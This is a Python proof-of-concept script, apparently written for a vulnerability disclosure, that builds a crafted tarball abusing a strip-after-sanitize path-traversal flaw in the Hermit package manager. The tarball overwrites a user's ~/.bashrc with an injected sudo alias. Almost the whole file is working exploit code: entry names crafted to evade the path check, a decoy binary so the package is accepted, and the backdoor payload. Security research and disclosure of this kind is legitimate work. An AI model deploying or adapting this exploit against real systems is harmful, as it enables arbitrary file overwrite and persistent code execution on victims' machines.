#!/usr/bin/env python3
"""
generate_tarball.py  -  Hermit strip-after-sanitize PoC tarball generator

Creates a malicious .tar.gz that, when installed by Hermit with the
attacker-controlled `strip` manifest field, overwrites ~/.bashrc to
inject an alias backdoor (demonstrating arbitrary code execution).

Vulnerability: archive/archive.go  makeDestPath() sanitizes the tar
entry name BEFORE applying `strip`, but strip operates on raw
string-split components preserving ".." literals.  After strip removes
the leading dummy directories, the remaining ".." components escape
the extraction destination.

Usage:
    python3 generate_tarball.py [--strip N] [--out FILE]
"""
import argparse
import io
import os
import sys
import tarfile

if sys.platform == "win32":
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")
    sys.stderr.reconfigure(encoding="utf-8", errors="replace")


def build_tarball(strip: int, output: str) -> None:
    """
    Build a tarball whose entry names pass Hermit's sanitizeExtractPath()
    but escape the package directory after strip is applied.

    Entry name formula:
        d1/d2/.../dS / ../../..  (S times) / .bashrc
                 ^^^               ^^^
              F forwards         B backwards

    - sanitizeExtractPath: filepath.Join(dest, entry) resolves F==B
      forward/back pairs, result stays inside dest  ->  PASSES
    - strings.Split + strip=S: removes first S parts (the d1..dS),
      leaving "../../../../.bashrc"  ->  ESCAPES dest by S levels
    """
    # --- 1. Build the exploit entry name ---
    dummies = "/".join(f"d{i}" for i in range(1, strip + 1))
    dotdots = "/".join([".."] * strip)
    evil_entry = f"{dummies}/{dotdots}/.bashrc"

    # --- 2. Legitimate binary (so Hermit accepts the package) ---
    legit_bin = b"#!/bin/sh\necho 'hermit-strip-poc tool'\n"
    legit_name = f"{dummies}/bin/tool"

    # --- 3. Payload: .bashrc alias backdoor ---
    payload = (
        b"\n# --- HERMIT-POC: strip-after-sanitize RCE ---\n"
        b"alias sudo='echo \"[!] RCE via hermit strip-after-sanitize\" && /usr/bin/sudo'\n"
        b"# --- end poc ---\n"
    )

    # --- 4. Write the tarball ---
    os.makedirs(os.path.dirname(output) or ".", exist_ok=True)
    with tarfile.open(output, "w:gz") as tar:
        # Legitimate binary entry
        hdr = tarfile.TarInfo(name=legit_name)
        hdr.size = len(legit_bin)
        hdr.mode = 0o755
        tar.addfile(hdr, io.BytesIO(legit_bin))

        # Exploit entry (path traversal after strip)
        hdr = tarfile.TarInfo(name=evil_entry)
        hdr.size = len(payload)
        hdr.mode = 0o644
        tar.addfile(hdr, io.BytesIO(payload))

    size = os.path.getsize(output)

    # --- 5. Print verification ---
    print("=" * 65)
    print("  HERMIT STRIP-AFTER-SANITIZE  ->  RCE TARBALL GENERATOR")
    print("=" * 65)
    print()
    print(f"  Output:       {output} ({size} bytes)")
    print(f"  Strip:        {strip}")
    print(f"  Legit entry:  {legit_name}")
    print(f"  Evil entry:   {evil_entry}")
    print()
    print("--- SANITIZE CHECK (what Hermit sees) ---")
    print(f"  filepath.Join(dest, \"{evil_entry}\")")
    print(f"  -> filepath.Clean resolves {strip} forward + {strip} back = stays in dest")
    print(f"  -> strings.HasPrefix(result, dest) = True  [PASSES]")
    print()
    print(f"--- AFTER strip={strip} ---")
    parts = evil_entry.split("/")
    remaining = "/".join(parts[strip:])
    print(f"  parts[{strip}:] = {parts[strip:]}")
    print(f"  remaining  = \"{remaining}\"")
    print(f"  filepath.Join(dest, \"{remaining}\")  ->  ESCAPES dest by {strip} levels")
    print()
    print("--- PAYLOAD (.bashrc content) ---")
    print(payload.decode(), end="")
    print()
    print("[+] Tarball written successfully.")


def main():
    parser = argparse.ArgumentParser(
        description="Generate exploit tarball for Hermit strip-after-sanitize"
    )
    parser.add_argument(
        "--strip", type=int, default=4,
        help="Strip value (default: 4 for default ~/.cache/hermit state dir)"
    )
    parser.add_argument(
        "--out", default="packages/malicious-rce.tar.gz",
        help="Output path (default: packages/malicious-rce.tar.gz)"
    )
    args = parser.parse_args()
    build_tarball(args.strip, args.out)


if __name__ == "__main__":
    main()
